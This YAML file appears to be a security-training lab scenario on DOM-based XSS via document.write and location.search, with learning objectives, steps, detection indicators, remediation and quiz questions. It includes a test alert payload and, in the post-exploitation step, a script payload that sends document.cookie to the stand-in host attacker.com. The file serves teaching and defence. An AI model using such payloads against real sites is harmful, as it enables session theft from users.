# Category: Cross-Site Scripting (XSS)
name: "DOM XSS in document.write sink using location.search source"
id: "xss-dom-document-write-001"
category: "xss"
subcategory: "dom_based"
difficulty: "apprentice"
estimated_time: "30 minutes"

description: |
  This scenario covers DOM-based XSS where the application uses the
  `document.write` method with data from `location.search` (the URL query
  string) without proper sanitization. The attacker can inject a script
  that executes when the page loads.

learning_objectives:
  - Understand DOM-based XSS and the DOM sink/source concept
  - Identify uses of `document.write` with unsanitized input
  - Craft a payload that exploits the document.write sink

tools:
  - Burp Suite
  - Browser developer tools

prerequisites:
  - Basic understanding of JavaScript and DOM
  - Access to a vulnerable web application or lab

steps:
  - id: "step1"
    phase: "reconnaissance"
    action: "Examine JavaScript code for document.write with location.search"
    commands:
      - "# Use browser's developer tools to inspect the page source"
      - "# Look for code like: document.write(location.search.substring(...))"
    expected_output: "Vulnerable code identified"
    detection: "None"

  - id: "step2"
    phase: "exploitation"
    action: "Inject payload into the URL parameter"
    commands:
      - "# Example URL: http://example.com/page?param=<script>alert('XSS')</script>"
      - "# Observe the response; if the script executes, it's vulnerable"
    expected_output: "JavaScript alert executes"
    detection: "Web server logs may show unusual parameters"

  - id: "step3"
    phase: "post_exploitation"
    action: "Perform malicious actions via DOM XSS"
    commands:
      - "# Payload to steal cookies: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
    expected_output: "Cookie sent to attacker"
    detection: "Attacker server logs"

compliance_controls:
  - standard: "MITRE ATT&CK"
    control: "T1189"
    description: "Drive-by Compromise"
  - standard: "OWASP"
    control: "A03:2021"
    description: "Injection"

detection:
  network_indicators:
    - "URLs containing script tags"
  log_indicators:
    - "Web server logs with suspicious query strings"
  endpoint_indicators:
    - "None"

remediation:
  immediate:
    - "Avoid using document.write with user-controlled data"
    - "Use safe DOM methods like textContent or innerText"
  long_term:
    - "Implement a Content Security Policy (CSP)"
    - "Use secure coding practices for DOM manipulation"

variables:
  target_url: "http://example.com/page?param=PAYLOAD"

assessment_questions:
  - "What is the difference between DOM XSS and reflected XSS?"
  - "What are common DOM sinks (document.write, innerHTML, eval)?"
  - "How can you prevent DOM-based XSS?"

references:
  - url: "https://owasp.org/www-community/attacks/DOM_Based_XSS"
    title: "OWASP DOM XSS"
  - url: "https://developer.mozilla.org/en-US/docs/Web/API/Document/write"
    title: "MDN document.write"